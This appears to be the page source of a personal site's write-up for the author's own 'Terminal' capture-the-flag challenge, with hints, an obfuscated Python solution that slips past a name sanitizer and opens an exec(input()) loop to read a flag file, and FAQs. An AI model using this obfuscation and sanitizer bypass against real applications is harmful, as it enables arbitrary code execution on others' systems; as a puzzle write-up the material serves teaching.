
import Accordion from '@/components/accordion'
import Sidebar from '@/components/sidebar'
import Link from 'next/link'
import ProminentLink from '@/components/prominentLink'
import DiscreetLink from '@/components/discreetLink'
import MailLink from '@/components/mailLink'
import Badge from '@/components/badge'
import { ToastContainer } from 'react-toastify'
import { FaChevronRight, FaSearch } from 'react-icons/fa'
import { RiArrowGoBackFill } from 'react-icons/ri'
import { CiLogout } from 'react-icons/ci'

import 'katex/dist/katex.min.css'
import Latex from 'react-latex-next'
import Spoiler from '@/components/spoiler'
import IncompleteMessage from '@/components/incompleteMessage'
import Image from 'next/image'
import { copyToClipboard, CopyButton } from '@/components/copyButton'
import 'react-toastify/dist/ReactToastify.css'
import Pilcrow from '@/components/pilcrow'
import { Thm, Lemma, Proof, Defn, Example } from '@/components/math'


export const metadata = {title:"Terminal"}

export default function Terminal () {
    return (
        <>
            <ToastContainer
                position='top-right'
                autoClose={5000}
                hideProgressBar={false}
                newestOnTop={false}
                closeOnClick
                rtl={false}
                pauseOnFocusLoss={false}
                pauseOnHover={false}
                theme='light'
            />
            <div className="relative w-full 2xl:max-w-[90%] flex h-full"> {/* whole thing (including large-screen left space filler, which is 10%) is max 90%; so 10% each side */}
    <Sidebar>

        
        <div className="scrollshadow-vertical overflow-y-auto w-full md:w-[calc(270px-2px)] min-h-10 h-[40vh] md:h-[40vh] xl:h-[calc(100vh-8.5rem)] break-all bg-background pt-3 md:pt-0 md:border-y-2 border-border-subtle">
                <ul className="scrollshadow-vertical dirtree mb-4 md:mb-0 group">
                    
                    

                    
                    
                        
                            <Accordion title="root" href="" type="folder" relDepth={ 0 } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="comp-sci" href="/comp-sci" type="folder" relDepth={ 1 } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="binary-search" href="/comp-sci/binary-search" type="file" relDepth={ 2 } isSelected={ false } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="maths" href="/maths" type="folder" relDepth={ 1 } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="Analysis-and-Topology" href="/maths/Analysis-and-Topology" type="course" relDepth={ 2 } isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="lagrange-multipliers" href="/maths/lagrange-multipliers" type="file" relDepth={ 2 } isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="proving-FTA" href="/maths/proving-FTA" type="folder" relDepth={ 2 } isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                                        
                        
                            <Accordion title="1-integer-axioms" href="/maths/proving-FTA/1-integer-axioms" type="file" relDepth={ 3 } isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="2-division-algo" href="/maths/proving-FTA/2-division-algo" type="file" relDepth={ 3 } isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="3-bezout-egcd" href="/maths/proving-FTA/3-bezout-egcd" type="file" relDepth={ 3 } isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="4-euclid" href="/maths/proving-FTA/4-euclid" type="file" relDepth={ 3 } isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="5-fta" href="/maths/proving-FTA/5-fta" type="file" relDepth={ 3 } isSelected={ false } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="research" href="/maths/research" type="folder" relDepth={ 2 } isSelected={ false } isOpenByDefault={ false } >
                                
                                    
                                        
                        
                            <Accordion title="CNATs" href="/maths/research/CNATs" type="file" relDepth={ 3 } isSelected={ false } />
                        
                    
                                    
                                        
                        
                            <Accordion title="cube-tilings" href="/maths/research/cube-tilings" type="file" relDepth={ 3 } isSelected={ false } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                        
                        
                            <Accordion title="writeups" href="/writeups" type="folder" relDepth={ 1 } isSelected={ false } isOpenByDefault={ true } >
                                
                                    
                                        
                        
                            <Accordion title="terminal" href="/writeups/terminal" type="file" relDepth={ 2 } isSelected={ true } />
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                                    
                                
                            </Accordion>
                        
                    
                </ul>
        </div>

    
        <div className="scrollshadow-vertical overflow-y-auto w-full md:w-[calc(270px-2px)] min-h-10 h-[30vh] md:h-[calc(60vh-8.5rem)] xl:hidden shrink-0 px-4 py-2 border-t-2 md:border-t-0 md:border-b-2 border-border-subtle">
            <h1 className="text-text-secondary text-lg">Table of contents</h1>
            <ul>
                
                    <li className="pt-1 font-bold"><Link href="#hint-1" className="tocentry text-link [@media(hover:hover)]:hover:underline">Hint 1</Link></li>
                
                    <li className="pt-1 font-bold"><Link href="#hint-2" className="tocentry text-link [@media(hover:hover)]:hover:underline">Hint 2</Link></li>
                
                    <li className="pt-1 font-bold"><Link href="#hint-3" className="tocentry text-link [@media(hover:hover)]:hover:underline">Hint 3</Link></li>
                
                    <li className="pt-1 font-bold"><Link href="#solution" className="tocentry text-link [@media(hover:hover)]:hover:underline">Solution</Link></li>
                
                    <li className="pt-1 font-bold"><Link href="#faqs" className="tocentry text-link [@media(hover:hover)]:hover:underline">FAQs</Link></li>
                
            </ul>
        </div>
    

    </Sidebar>

    <article className="w-full min-w-0 px-6 pt-3 mb-14">

        <div className="h-[4.5rem] md:h-0"/>

        <div className="flex flex-wrap items-center space-x-2 mb-3">
            
                <div className="flex flex-wrap items-center align-middle space-x-1 mr-2">
                    
                        <span className="font-bold text-text-secondary">/</span>
                        <p className="text-lg font-bold text-link underline [@media(hover:hover)]:hover:underline"><Link href="/writeups">writeups</Link></p>
                    
                </div>
            

            
                
                <Badge color="gray">python-golf</Badge>
                
            
        </div>

        
            <p className="text-text-secondary mb-2">Created 08 Jun 2024</p>
        

        <div className="article mb-4">
            <h1 id="terminal-challenge">Terminal Challenge</h1>

<p>A writeup for the <DiscreetLink href='https://terminal.danielc.rocks'>hangman</DiscreetLink> challenge on my homepage. As far as I know it's a completely original challenge; if anything I'm proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of <DiscreetLink href='https://en.wikipedia.org/wiki/Quine_(computing)'>quines</DiscreetLink>.</p>

<div className="text-2xl font-bold group flex space-x-1 pt-6 pb-2 items-baseline"><h2 id="hint-1" className="scroll-m-[calc(2.25rem+2*1rem+0.5rem)] md:scroll-m-[0.5rem] text-articleh2">Hint 1</h2><Pilcrow href="#hint-1" text="https://tripos.guru/writeups/terminal#hint-1"/></div>

<Spoiler>

<p>The hangman game really is <ProminentLink href='https://youtu.be/le5uGqHKll8?t=550'>unbeatable</ProminentLink>. The goal of the challenge is to take advantage of the name loading and use that to read the flag.</p>

</Spoiler>

<div className="text-2xl font-bold group flex space-x-1 pt-6 pb-2 items-baseline"><h2 id="hint-2" className="scroll-m-[calc(2.25rem+2*1rem+0.5rem)] md:scroll-m-[0.5rem] text-articleh2">Hint 2</h2><Pilcrow href="#hint-2" text="https://tripos.guru/writeups/terminal#hint-2"/></div>

<Spoiler>

<p>Look at the name verification function. If we can write some python code that sanitizes to <code>ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant</code>, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran <code>game.py</code>.</p>

<p><br/>
So the goal is: write a python file that reads <code>/flag.txt</code>, whose alphanumeric characters in order are <code>Erroryour...</code>.</p>

</Spoiler>

<div className="text-2xl font-bold group flex space-x-1 pt-6 pb-2 items-baseline"><h2 id="hint-3" className="scroll-m-[calc(2.25rem+2*1rem+0.5rem)] md:scroll-m-[0.5rem] text-articleh2">Hint 3</h2><Pilcrow href="#hint-3" text="https://tripos.guru/writeups/terminal#hint-3"/></div>

<Spoiler>

<p>Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful.</p>

<p><br/></p>

<p>We can have variables because underscores are allowed in python variable names.
Also we have numbers, by doing something like:</p>

<div className="codehilite">
<pre><span></span><code><span className="n">_</span>&nbsp;<span className="o">=</span>&nbsp;<span className="s1">&#39;&#39;</span>&nbsp;<span className="o">&lt;</span>&nbsp;<span className="s1">&#39;_&#39;</span>&nbsp;<span className="c1">#&nbsp;one&nbsp;(compares&nbsp;ascii&nbsp;values)</span><br/><span className="n">__</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span>&nbsp;<span className="c1">#&nbsp;four</span><br/><span className="n">___</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">__</span><span className="o">*</span><span className="n">__</span>&nbsp;<span className="c1">#&nbsp;sixteen</span><br/></code></pre>
</div>

</Spoiler>

<div className="text-2xl font-bold group flex space-x-1 pt-6 pb-2 items-baseline"><h2 id="solution" className="scroll-m-[calc(2.25rem+2*1rem+0.5rem)] md:scroll-m-[0.5rem] text-articleh2">Solution</h2><Pilcrow href="#solution" text="https://tripos.guru/writeups/terminal#solution"/></div>

<Spoiler>

<p>What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative?</p>

<p><br/></p>

<p>For readability, I've named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a <ProminentLink href='https://github.com/clemg/pythongolfer?tab=readme-ov-file#3---qa'>trick</ProminentLink> of encoding a utf-8 string in utf-16 to garble it.</p>

<div className="codehilite relative">
<div className="absolute top-2 right-2"><CopyButton text="'Erroryo'\nU,R,N = 'urn'\n'amedoesn'\nT,S = 'ts'\n'eemtob'\nEVAL = eval\nSTR = EVAL(S+T+R)\nI,D = 'id'\nDIR = EVAL(D+I+R)\n'IllcallyouMrUn'\nONE = ''&lt;'_'\nSEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE\nBUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S\nFUNCS = DIR(EVAL('__import__(&quot;'+BUILTINS+'&quot;)'))\n'ant'\n\nEXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE]\nBYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE]\n\n# the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is:\n# while True: exec(input());\n\nSHELLCODE = BYTES+'(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;'+U+STR(SEVEN+SEVEN+ONE+ONE)+'&quot;)['+STR(ONE+ONE)+':]'\n\nEVAL(EXEC+'('+SHELLCODE+')')"/></div>
<pre><span></span><code><span className="s1">&#39;Erroryo&#39;</span><br/><span className="n">U</span><span className="p">,</span><span className="n">R</span><span className="p">,</span><span className="n">N</span>&nbsp;<span className="o">=</span>&nbsp;<span className="s1">&#39;urn&#39;</span><br/><span className="s1">&#39;amedoesn&#39;</span><br/><span className="n">T</span><span className="p">,</span><span className="n">S</span>&nbsp;<span className="o">=</span>&nbsp;<span className="s1">&#39;ts&#39;</span><br/><span className="s1">&#39;eemtob&#39;</span><br/><span className="n">EVAL</span>&nbsp;<span className="o">=</span>&nbsp;<span className="nb">eval</span><br/><span className="n">STR</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">EVAL</span><span className="p">(</span><span className="n">S</span><span className="o">+</span><span className="n">T</span><span className="o">+</span><span className="n">R</span><span className="p">)</span><br/><span className="n">I</span><span className="p">,</span><span className="n">D</span>&nbsp;<span className="o">=</span>&nbsp;<span className="s1">&#39;id&#39;</span><br/><span className="n">DIR</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">EVAL</span><span className="p">(</span><span className="n">D</span><span className="o">+</span><span className="n">I</span><span className="o">+</span><span className="n">R</span><span className="p">)</span><br/><span className="s1">&#39;IllcallyouMrUn&#39;</span><br/><span className="n">ONE</span>&nbsp;<span className="o">=</span>&nbsp;<span className="s1">&#39;&#39;</span><span className="o">&lt;</span><span className="s1">&#39;_&#39;</span><br/><span className="n">SEVEN</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><br/><span className="n">BUILTINS</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">STR</span><span className="p">(</span><span className="n">EVAL</span><span className="p">)[</span><span className="n">ONE</span><span className="p">:</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">ONE</span><span className="p">]</span><span className="o">+</span><span className="n">I</span><span className="o">+</span><span className="n">N</span><span className="o">+</span><span className="n">S</span><br/><span className="n">FUNCS</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">DIR</span><span className="p">(</span><span className="n">EVAL</span><span className="p">(</span><span className="s1">&#39;__import__(&quot;&#39;</span><span className="o">+</span><span className="n">BUILTINS</span><span className="o">+</span><span className="s1">&#39;&quot;)&#39;</span><span className="p">))</span><br/><span className="s1">&#39;ant&#39;</span><br/><br/><span className="n">EXEC</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">FUNCS</span><span className="p">[</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">*</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">ONE</span><span className="o">-</span><span className="n">ONE</span><span className="p">]</span><br/><span className="n">BYTES</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">FUNCS</span><span className="p">[</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">*</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">SEVEN</span><span className="o">-</span><span className="n">ONE</span><span className="o">-</span><span className="n">ONE</span><span className="p">]</span><br/><br/><span className="c1">#&nbsp;the&nbsp;garbage&nbsp;characters&nbsp;are&nbsp;a&nbsp;utf16&nbsp;encoding&nbsp;of&nbsp;the&nbsp;utf8&nbsp;shellcode,&nbsp;the&nbsp;decoded&nbsp;version&nbsp;is:</span><br/><span className="c1">#&nbsp;while&nbsp;True:&nbsp;exec(input());</span><br/><br/><span className="n">SHELLCODE</span>&nbsp;<span className="o">=</span>&nbsp;<span className="n">BYTES</span><span className="o">+</span><span className="s1">&#39;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#39;</span><span className="o">+</span><span className="n">U</span><span className="o">+</span><span className="n">STR</span><span className="p">(</span><span className="n">SEVEN</span><span className="o">+</span><span className="n">SEVEN</span><span className="o">+</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;&quot;)[&#39;</span><span className="o">+</span><span className="n">STR</span><span className="p">(</span><span className="n">ONE</span><span className="o">+</span><span className="n">ONE</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;:]&#39;</span><br/><br/><span className="n">EVAL</span><span className="p">(</span><span className="n">EXEC</span><span className="o">+</span><span className="s1">&#39;(&#39;</span><span className="o">+</span><span className="n">SHELLCODE</span><span className="o">+</span><span className="s1">&#39;)&#39;</span><span className="p">)</span><br/></code></pre>
</div>

<p><br/></p>

<div className='inline'>
And the minified version:
</div>

<div className="codehilite relative">
<div className="absolute top-2 right-2"><CopyButton text="'Erroryo';________,_____,_________='urn';'amedoesn';__________,______='ts';'eemtob';___=eval;____,___________='id';'IllcallyouMrUn';_=''&lt;'_';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___('__import__(&quot;'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+'&quot;)')))[-__*__-_-_]+'('+____________[-__*__-__-__-_-_]+'(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;'+________+_______(__+__+_+_)+'&quot;)['+_______(_+_)+':]'+')');'ant'"/></div>
<pre><span></span><code><span className="s1">&#39;Erroryo&#39;</span><span className="p">;</span><span className="n">________</span><span className="p">,</span><span className="n">_____</span><span className="p">,</span><span className="n">_________</span><span className="o">=</span><span className="s1">&#39;urn&#39;</span><span className="p">;</span><span className="s1">&#39;amedoesn&#39;</span><span className="p">;</span><span className="n">__________</span><span className="p">,</span><span className="n">______</span><span className="o">=</span><span className="s1">&#39;ts&#39;</span><span className="p">;</span><span className="s1">&#39;eemtob&#39;</span><span className="p">;</span><span className="n">___</span><span className="o">=</span><span className="nb">eval</span><span className="p">;</span><span className="n">____</span><span className="p">,</span><span className="n">___________</span><span className="o">=</span><span className="s1">&#39;id&#39;</span><span className="p">;</span><span className="s1">&#39;IllcallyouMrUn&#39;</span><span className="p">;</span><span className="n">_</span><span className="o">=</span><span className="s1">&#39;&#39;</span><span className="o">&lt;</span><span className="s1">&#39;_&#39;</span><span className="p">;</span><span className="n">__</span><span className="o">=</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="p">;</span><span className="n">___</span><span className="p">((</span><span className="n">____________</span><span className="o">:=</span><span className="n">___</span><span className="p">(</span><span className="n">___________</span><span className="o">+</span><span className="n">____</span><span className="o">+</span><span className="n">_____</span><span className="p">)(</span><span className="n">___</span><span className="p">(</span><span className="s1">&#39;__import__(&quot;&#39;</span><span className="o">+</span><span className="p">(</span><span className="n">_______</span><span className="o">:=</span><span className="n">___</span><span className="p">(</span><span className="n">______</span><span className="o">+</span><span className="n">__________</span><span className="o">+</span><span className="n">_____</span><span className="p">))(</span><span className="n">___</span><span className="p">)[</span><span className="n">_</span><span className="p">:</span><span className="n">__</span><span className="o">-</span><span className="n">_</span><span className="p">]</span><span className="o">+</span><span className="n">____</span><span className="o">+</span><span className="n">_________</span><span className="o">+</span><span className="n">______</span><span className="o">+</span><span className="s1">&#39;&quot;)&#39;</span><span className="p">)))[</span><span className="o">-</span><span className="n">__</span><span className="o">*</span><span className="n">__</span><span className="o">-</span><span className="n">_</span><span className="o">-</span><span className="n">_</span><span className="p">]</span><span className="o">+</span><span className="s1">&#39;(&#39;</span><span className="o">+</span><span className="n">____________</span><span className="p">[</span><span className="o">-</span><span className="n">__</span><span className="o">*</span><span className="n">__</span><span className="o">-</span><span className="n">__</span><span className="o">-</span><span className="n">__</span><span className="o">-</span><span className="n">_</span><span className="o">-</span><span className="n">_</span><span className="p">]</span><span className="o">+</span><span className="s1">&#39;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#39;</span><span className="o">+</span><span className="n">________</span><span className="o">+</span><span className="n">_______</span><span className="p">(</span><span className="n">__</span><span className="o">+</span><span className="n">__</span><span className="o">+</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;&quot;)[&#39;</span><span className="o">+</span><span className="n">_______</span><span className="p">(</span><span className="n">_</span><span className="o">+</span><span className="n">_</span><span className="p">)</span><span className="o">+</span><span className="s1">&#39;:]&#39;</span><span className="o">+</span><span className="s1">&#39;)&#39;</span><span className="p">);</span><span className="s1">&#39;ant&#39;</span><br/></code></pre>
</div>

</Spoiler>

<div className="text-2xl font-bold group flex space-x-1 pt-6 pb-2 items-baseline"><h2 id="faqs" className="scroll-m-[calc(2.25rem+2*1rem+0.5rem)] md:scroll-m-[0.5rem] text-articleh2">FAQs</h2><Pilcrow href="#faqs" text="https://tripos.guru/writeups/terminal#faqs"/></div>

<div className="flex flex-col divide-y divide-border-strong">
    <details className="faq-question">
        <summary>How did you get Python to run in the browser???</summary>
        <div>
            I talked to my comp-sci teacher who helps run this <DiscreetLink href='https://www.pythonsponge.com/'>educational tool</DiscreetLink> - and he told me about how they use <DiscreetLink href='https://pyodide.org/en/stable/'>Pyodide</DiscreetLink> and a <DiscreetLink href='https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers'>web worker</DiscreetLink>. So I implemented that.
        </div>
    </details>
    <details className="faq-question">
        <summary>This is all client-side, so shouldn't I be able to cheese the flag by just looking in F12?</summary>
        <div className="space-y-2">
            <p>
                Indeed there used to be a cheese solution by just going into F12 and realising that <code>init.py</code> contained the flag (thanks @xp3dx) - but I moved it &gt;:)
            </p>
            <p>
                I have no idea if the flag is still accessible like this because I don't know enough about Next.js, but I will tell you that in my Next.js app it's in <code>components/challenge.js</code> - feel free to try and hunt for it in whatever obsfucated garbage Next.js gives you...
            </p>
        </div>
    </details>
</div>

        </div>

        
            <div className="border-t-2 border-border-subtle pt-4 flex items-top justify-between">
                
                    <div className="flex justify-start">
                        <Link href="/writeups">
                            <div className="flex items-center justify-center space-x-1 text-text-secondary underline">
                                <RiArrowGoBackFill/>
                                <p>up a level</p>
                            </div>
                        </Link>
                    </div>
                

                
                    <div className="">
                        <CopyButton text="A writeup for the hangman challenge on my homepage. As far as I know it&#x27;s a completely original challenge; if anything I&#x27;m proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of quines. Hint 1 The hangman game really is unbeatable. The goal of the challenge is to take advantage of the name loading and use that to read the flag. Hint 2 Look at the name verification function. If we can write some python code that sanitizes to ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran game.py. So the goal is: write a python file that reads /flag.txt, whose alphanumeric characters in order are Erroryour.... Hint 3 Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful. We can have variables because underscores are allowed in python variable names. Also we have numbers, by doing something like: _ = &#x27;&#x27; &lt; &#x27;_&#x27; # one (compares ascii values) __ = _+_+_+_ # four ___ = __*__ # sixteen Solution What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative? For readability, I&#x27;ve named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a trick of encoding a utf-8 string in utf-16 to garble it. &#x27;Erroryo&#x27; U,R,N = &#x27;urn&#x27; &#x27;amedoesn&#x27; T,S = &#x27;ts&#x27; &#x27;eemtob&#x27; EVAL = eval STR = EVAL(S+T+R) I,D = &#x27;id&#x27; DIR = EVAL(D+I+R) &#x27;IllcallyouMrUn&#x27; ONE = &#x27;&#x27;&lt;&#x27;_&#x27; SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S FUNCS = DIR(EVAL(&#x27;__import__(&quot;&#x27;+BUILTINS+&#x27;&quot;)&#x27;)) &#x27;ant&#x27; EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE] BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE] # the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is: # while True: exec(input()); SHELLCODE = BYTES+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+U+STR(SEVEN+SEVEN+ONE+ONE)+&#x27;&quot;)[&#x27;+STR(ONE+ONE)+&#x27;:]&#x27; EVAL(EXEC+&#x27;(&#x27;+SHELLCODE+&#x27;)&#x27;) And the minified version: &#x27;Erroryo&#x27;;________,_____,_________=&#x27;urn&#x27;;&#x27;amedoesn&#x27;;__________,______=&#x27;ts&#x27;;&#x27;eemtob&#x27;;___=eval;____,___________=&#x27;id&#x27;;&#x27;IllcallyouMrUn&#x27;;_=&#x27;&#x27;&lt;&#x27;_&#x27;;__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___(&#x27;__import__(&quot;&#x27;+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+&#x27;&quot;)&#x27;)))[-__*__-_-_]+&#x27;(&#x27;+____________[-__*__-__-__-_-_]+&#x27;(&quot;桷汩⁥牔敵›硥捥椨灮瑵⤨㬩&quot;,&quot;&#x27;+________+_______(__+__+_+_)+&#x27;&quot;)[&#x27;+_______(_+_)+&#x27;:]&#x27;+&#x27;)&#x27;);&#x27;ant&#x27; FAQs How did you get Python to run in the browser??? I talked to my comp-sci teacher who helps run this educational tool - and he told me about how they use Pyodide and a web worker. So I implemented that. This is all client-side, so shouldn&#x27;t I be able to cheese the flag by just looking in F12? Indeed there used to be a cheese solution by just going into F12 and realising that init.py contained the flag (thanks @xp3dx) - but I moved it &gt;:) I have no idea if the flag is still accessible like this because I don&#x27;t know enough about Next.js, but I will tell you that in my Next.js app it&#x27;s in components/challenge.js - feel free to try and hunt for it in whatever obsfucated garbage Next.js gives you...">Copy article plaintext</CopyButton>
                    </div>
                
            </div>
        

        <div className="border-t-2 border-border-subtle pt-4 mt-8 text-sm text-text-secondary">
            <p>This educational content is licensed under <DiscreetLink href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</DiscreetLink>. You may share and adapt with attribution.</p>
        </div>

    </article>

    
        <nav className="hidden xl:flex w-[270px] xl:shrink-0 xl:justify-start h-100% min-h-screen border-l-2 border-border-subtle px-6 py-4">
            <div className="fixed text-text-secondary">
                <h1 className="text-lg">Table of contents</h1>
                <ul>
                    
                        <li className="pt-1 font-bold"><Link href="#hint-1" className="text-link [@media(hover:hover)]:hover:underline">Hint 1</Link></li>
                    
                        <li className="pt-1 font-bold"><Link href="#hint-2" className="text-link [@media(hover:hover)]:hover:underline">Hint 2</Link></li>
                    
                        <li className="pt-1 font-bold"><Link href="#hint-3" className="text-link [@media(hover:hover)]:hover:underline">Hint 3</Link></li>
                    
                        <li className="pt-1 font-bold"><Link href="#solution" className="text-link [@media(hover:hover)]:hover:underline">Solution</Link></li>
                    
                        <li className="pt-1 font-bold"><Link href="#faqs" className="text-link [@media(hover:hover)]:hover:underline">FAQs</Link></li>
                    
                </ul>
            </div>
        </nav>
    
</div>
        </>
    )
}
    